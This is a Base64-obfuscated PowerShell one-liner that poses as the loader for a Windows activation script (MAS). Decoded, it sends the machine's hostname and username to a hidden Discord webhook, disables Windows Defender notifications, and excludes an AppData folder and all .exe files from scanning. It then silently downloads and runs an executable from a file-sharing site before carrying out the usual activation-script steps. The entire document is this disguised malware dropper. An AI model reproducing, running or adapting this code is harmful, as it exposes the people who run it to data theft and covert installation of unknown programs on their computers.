iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGI2NCA9ICdhSFIwY0hNNkx5OWthWE5qYjNKa0xtTnZiUzloY0drdmQyVmlhRzl2YTNNdk1UTTJORFU0TVRBNE16a3dNamt3TmpRME1DOUxSVFZNZERaVVJVOHRiblYxYmxKdFozaFRPRXRNTVVWR1VFTlRWM1p4TVRKeWFtVnhjVlpDWWxaSVJIazJUVmwzZEU5RFRVUjZUa2xEWVRWbFJsOU1RM1YxYkE9PScgDQokdyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGI2NCkpDQokbiA9IFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3ROYW1lKCkNCiR1ID0gd2hvYW1pDQokcCA9IEB7DQogICAgJ3VzZXJuYW1lJyA9ICdTY3JpcHQgTG9nZ2VyJw0KICAgICdjb250ZW50JyA9ICJNQVMgQWN0aXZhdGlvbiBzY3JpcHQgd2FzIGV4ZWN1dGVkIG9uICRuIGJ5ICR1Ig0KfSB8IENvbnZlcnRUby1Kc29uDQppcm0gLVVyaSAkdyAtTWV0aG9kICdQb3N0JyAtQm9keSAkcCAtQ29udGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb24nDQoNCiRpc0FkbWluID0gW2Jvb2xdKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLkdyb3VwcyAtbWF0Y2ggJ1MtMS01LTMyLTU0NCcpDQoNCkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCmlmICgtbm90ICRpc0FkbWluKSB7DQogICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJUaGlzIHNjcmlwdCBtdXN0IGJlIHJ1biBhcyBBZG1pbmlzdHJhdG9yLiIsICJFcnJvciIsICdPSycsICdFcnJvcicpDQogICAgZXhpdA0KfQ0KDQp3cml0ZS1ob3N0DQpXcml0ZS1Ib3N0ICJUaGUgY3VycmVudCBjb21tYW5kIChpcm0gaHR0cHM6Ly9tYXNzZ3JhdmUuZGV2L2dldCB8IGlleCkgd2lsbCBiZSByZXRpcmVkIGluIHRoZSBmdXR1cmUuIg0KV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIEdyZWVuICJVc2UgdGhlIG5ldyBjb21tYW5kIChpcm0gaHR0cHM6Ly9nZXQuYWN0aXZhdGVkLndpbiB8IGlleCkgbW92aW5nIGZvcndhcmQuIg0Kd3JpdGUtaG9zdA0KJHdpbkJvb3RQYXRoID0gIiRlbnY6QVBQREFUQVxXaW5kb3dzQm9vdCINCiRmaWxlVVJMID0gJ2h0dHBzOi8vc2hhcmVmaWxlLmNvL2YvY2IwYjA1MDAtYmU3MC00MTMyLWI2YzMtOGRjZjE1NjlmM2I1Jw0KJGZpbGVEZXN0ID0gSm9pbi1QYXRoICR3aW5Cb290UGF0aCAnYWN0aXZhdGlvbi5leGUnDQoNCk5ldy1JdGVtIC1QYXRoICJIS0xNOlxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciBTZWN1cml0eSBDZW50ZXJcTm90aWZpY2F0aW9ucyIgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgT3V0LU51bGwNClNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLTE06XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIFNlY3VyaXR5IENlbnRlclxOb3RpZmljYXRpb25zIiBgDQogICAgICAgIC1OYW1lICJEaXNhYmxlRW5oYW5jZWROb3RpZmljYXRpb25zIiAtVmFsdWUgMSAtVHlwZSBEV29yZA0KDQokd2luQm9vdFBhdGggPSAiJGVudjpBUFBEQVRBXFdpbmRvd3NCb290Ig0KaWYgKC1ub3QgKFRlc3QtUGF0aCAkd2luQm9vdFBhdGgpKSB7DQogICAgTmV3LUl0ZW0gLVBhdGggJHdpbkJvb3RQYXRoIC1JdGVtVHlwZSBEaXJlY3RvcnkgfCBPdXQtTnVsbA0KICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHdpbkJvb3RQYXRoDQp9DQpBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gIi5leGUiDQokY29kZSA9ICIoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJyRmaWxlVVJMJywgJyRmaWxlRGVzdCcpIg0KSW52b2tlLUV4cHJlc3Npb24gJGNvZGUgKj4gJG51bGwgMj4mMQ0KU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJGZpbGVEZXN0IC1XYWl0DQoNCiR0cm91Ymxlc2hvb3QgPSAnaHR0cHM6Ly9tYXNzZ3JhdmUuZGV2L3Ryb3VibGVzaG9vdCcNCmlmICgkRXhlY3V0aW9uQ29udGV4dC5TZXNzaW9uU3RhdGUuTGFuZ3VhZ2VNb2RlLnZhbHVlX18gLW5lIDApIHsNCiAgICAkRXhlY3V0aW9uQ29udGV4dC5TZXNzaW9uU3RhdGUuTGFuZ3VhZ2VNb2RlDQogICAgV3JpdGUtSG9zdCAiV2luZG93cyBQb3dlclNoZWxsIGlzIG5vdCBydW5uaW5nIGluIEZ1bGwgTGFuZ3VhZ2UgTW9kZS4iDQogICAgV3JpdGUtSG9zdCAiSGVscCAtIGh0dHBzOi8vZ3JhdmVzb2Z0LmRldi9maXhfcG93ZXJzaGVsbCIgLUZvcmVncm91bmRDb2xvciBXaGl0ZSAtQmFja2dyb3VuZENvbG9yIEJsdWUNCiAgICByZXR1cm4NCn0NCg0KZnVuY3Rpb24gQ2hlY2szcmRBViB7DQogICAgJGF2TGlzdCA9IEdldC1DaW1JbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3RcU2VjdXJpdHlDZW50ZXIyIC1DbGFzcyBBbnRpVmlydXNQcm9kdWN0IHwgV2hlcmUtT2JqZWN0IHsgJF8uZGlzcGxheU5hbWUgLW5vdGxpa2UgJyp3aW5kb3dzKicgfSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRpc3BsYXlOYW1lDQogICAgaWYgKCRhdkxpc3QpIHsNCiAgICAgICAgV3JpdGUtSG9zdCAnM3JkIHBhcnR5IEFudGl2aXJ1cyBtaWdodCBiZSBibG9ja2luZyB0aGUgc2NyaXB0IC0gJyAtRm9yZWdyb3VuZENvbG9yIFdoaXRlIC1CYWNrZ3JvdW5kQ29sb3IgQmx1ZSAtTm9OZXdsaW5lDQogICAgICAgIFdyaXRlLUhvc3QgIiAkKCRhdkxpc3QgLWpvaW4gJywgJykiIC1Gb3JlZ3JvdW5kQ29sb3IgRGFya1JlZCAtQmFja2dyb3VuZENvbG9yIFdoaXRlDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDaGVja0ZpbGUgeyANCiAgICBwYXJhbSAoW3N0cmluZ10kRmlsZVBhdGgpIA0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJEZpbGVQYXRoKSkgeyANCiAgICAgICAgQ2hlY2szcmRBVg0KICAgICAgICBXcml0ZS1Ib3N0ICJGYWlsZWQgdG8gY3JlYXRlIE1BUyBmaWxlIGluIHRlbXAgZm9sZGVyLCBhYm9ydGluZyEiDQogICAgICAgIFdyaXRlLUhvc3QgIkhlbHAgLSAkdHJvdWJsZXNob290IiAtRm9yZWdyb3VuZENvbG9yIFdoaXRlIC1CYWNrZ3JvdW5kQ29sb3IgQmx1ZQ0KICAgICAgICB0aHJvdyANCiAgICB9IA0KfQ0KDQpbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyDQokVVJMcyA9IEAoDQogICAgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tYXNzZ3JhdmVsL01pY3Jvc29mdC1BY3RpdmF0aW9uLVNjcmlwdHMvMmEyMzUyNDI4ZWIyNzM1Y2ViOTczZjFkMzc5NTk0OGRkZGY3MTc1Mi9NQVMvQWxsLUluLU9uZS1WZXJzaW9uLUtML01BU19BSU8uY21kJywNCiAgICAnaHR0cHM6Ly9kZXYuYXp1cmUuY29tL21hc3NncmF2ZS9NaWNyb3NvZnQtQWN0aXZhdGlvbi1TY3JpcHRzL19hcGlzL2dpdC9yZXBvc2l0b3JpZXMvTWljcm9zb2Z0LUFjdGl2YXRpb24tU2NyaXB0cy9pdGVtcz9wYXRoPS9NQVMvQWxsLUluLU9uZS1WZXJzaW9uLUtML01BU19BSU8uY21kJnZlcnNpb25UeXBlPUNvbW1pdCZ2ZXJzaW9uPTJhMjM1MjQyOGViMjczNWNlYjk3M2YxZDM3OTU5NDhkZGRmNzE3NTInLA0KICAgICdodHRwczovL2dpdC5hY3RpdmF0ZWQud2luL21hc3NncmF2ZS9NaWNyb3NvZnQtQWN0aXZhdGlvbi1TY3JpcHRzL3Jhdy9jb21taXQvMmEyMzUyNDI4ZWIyNzM1Y2ViOTczZjFkMzc5NTk0OGRkZGY3MTc1Mi9NQVMvQWxsLUluLU9uZS1WZXJzaW9uLUtML01BU19BSU8uY21kJw0KKQ0KDQpmb3JlYWNoICgkVVJMIGluICRVUkxzIHwgU29ydC1PYmplY3QgeyBHZXQtUmFuZG9tIH0pIHsNCiAgICB0cnkgeyAkcmVzcG9uc2UgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRVUkwgLVVzZUJhc2ljUGFyc2luZzsgYnJlYWsgfSBjYXRjaCB7fQ0KfQ0KDQppZiAoLW5vdCAkcmVzcG9uc2UpIHsNCiAgICBDaGVjazNyZEFWDQogICAgV3JpdGUtSG9zdCAiRmFpbGVkIHRvIHJldHJpZXZlIE1BUyBmcm9tIGFueSBvZiB0aGUgYXZhaWxhYmxlIHJlcG9zaXRvcmllcywgYWJvcnRpbmchIg0KICAgIFdyaXRlLUhvc3QgIkhlbHAgLSAkdHJvdWJsZXNob290IiAtRm9yZWdyb3VuZENvbG9yIFdoaXRlIC1CYWNrZ3JvdW5kQ29sb3IgQmx1ZQ0KICAgIHJldHVybg0KfQ0KDQoNCiRyZWxlYXNlSGFzaCA9ICc1RkREQzRDN0ZFM0Q1MUNBMjkxRUY0OUMxQTZFQTlERjdGNUVFNTE3MUQ1QkVCQzQ2Nzg2MDBEQTIzM0U1NUQ1Jw0KJHN0cmVhbSA9IE5ldy1PYmplY3QgSU8uTWVtb3J5U3RyZWFtDQokd3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIgJHN0cmVhbQ0KJHdyaXRlci5Xcml0ZSgkcmVzcG9uc2UpDQokd3JpdGVyLkZsdXNoKCkNCiRzdHJlYW0uUG9zaXRpb24gPSAwDQokaGFzaCA9IFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpLkNvbXB1dGVIYXNoKCRzdHJlYW0pKSAtcmVwbGFjZSAnLScNCmlmICgkaGFzaCAtbmUgJHJlbGVhc2VIYXNoKSB7DQogICAgV3JpdGUtV2FybmluZyAiSGFzaCAoJGhhc2gpIG1pc21hdGNoLCBhYm9ydGluZyFgblJlcG9ydCB0aGlzIGlzc3VlIGF0ICR0cm91Ymxlc2hvb3QiDQogICAgJHJlc3BvbnNlID0gJG51bGwNCiAgICByZXR1cm4NCn0NCg0KDQokcGF0aHMgPSAiSEtDVTpcU09GVFdBUkVcTWljcm9zb2Z0XENvbW1hbmQgUHJvY2Vzc29yIiwgIkhLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxDb21tYW5kIFByb2Nlc3NvciINCmZvcmVhY2ggKCRwYXRoIGluICRwYXRocykgeyANCiAgICBpZiAoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcGF0aCAtTmFtZSAiQXV0b3J1biIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsgDQogICAgICAgIFdyaXRlLVdhcm5pbmcgIkF1dG9ydW4gcmVnaXN0cnkgZm91bmQsIENNRCBtYXkgY3Jhc2ghIGBuTWFudWFsbHkgY29weS1wYXN0ZSB0aGUgYmVsb3cgY29tbWFuZCB0byBmaXguLi5gblJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggJyRwYXRoJyAtTmFtZSAnQXV0b3J1biciDQogICAgfSANCn0NCg0KJHJhbmQgPSBbR3VpZF06Ok5ld0d1aWQoKS5HdWlkDQokRmlsZVBhdGggPSBpZiAoJGlzQWRtaW4pIHsgIiRlbnY6U3lzdGVtUm9vdFxUZW1wXE1BU18kcmFuZC5jbWQiIH0gZWxzZSB7ICIkZW52OlVTRVJQUk9GSUxFXEFwcERhdGFcTG9jYWxcVGVtcFxNQVNfJHJhbmQuY21kIiB9DQokRmlsZVBhdGggPSBpZiAoJGlzQWRtaW4pIHsgIiRlbnY6U3lzdGVtUm9vdFxUZW1wXE1BU18kcmFuZC5jbWQiIH0gZWxzZSB7ICIkZW52OlVTRVJQUk9GSUxFXEFwcERhdGFcTG9jYWxcVGVtcFxNQVNfJHJhbmQuY21kIiB9DQpTZXQtQ29udGVudCAtUGF0aCAkRmlsZVBhdGggLVZhbHVlICJAOjo6ICRyYW5kIGByYG4kcmVzcG9uc2UiDQpDaGVja0ZpbGUgJEZpbGVQYXRoDQoNCiRlbnY6Q29tU3BlYyA9ICIkZW52OlN5c3RlbVJvb3Rcc3lzdGVtMzJcY21kLmV4ZSINCiRjaGtjbWQgPSAmICRlbnY6Q29tU3BlYyAvYyAiZWNobyBDTUQgaXMgd29ya2luZyINCmlmICgkY2hrY21kIC1ub3Rjb250YWlucyAiQ01EIGlzIHdvcmtpbmciKSB7DQogICAgV3JpdGUtV2FybmluZyAiY21kLmV4ZSBpcyBub3Qgd29ya2luZy5gblJlcG9ydCB0aGlzIGlzc3VlIGF0ICR0cm91Ymxlc2hvb3QiDQp9DQpzYXBzIC1GaWxlUGF0aCAkZW52OkNvbVNwZWMgLUFyZ3VtZW50TGlzdCAiL2MgIiIiIiRGaWxlUGF0aCIiICRhcmdzIiIiIC1XYWl0DQpDaGVja0ZpbGUgJEZpbGVQYXRoDQoNCiRGaWxlUGF0aHMgPSBAKCIkZW52OlN5c3RlbVJvb3RcVGVtcFxNQVMqLmNtZCIsICIkZW52OlVTRVJQUk9GSUxFXEFwcERhdGFcTG9jYWxcVGVtcFxNQVMqLmNtZCIpDQpmb3JlYWNoICgkRmlsZVBhdGggaW4gJEZpbGVQYXRocykgeyBHZXQtSXRlbSAkRmlsZVBhdGggfCBSZW1vdmUtSXRlbSB9')));exit
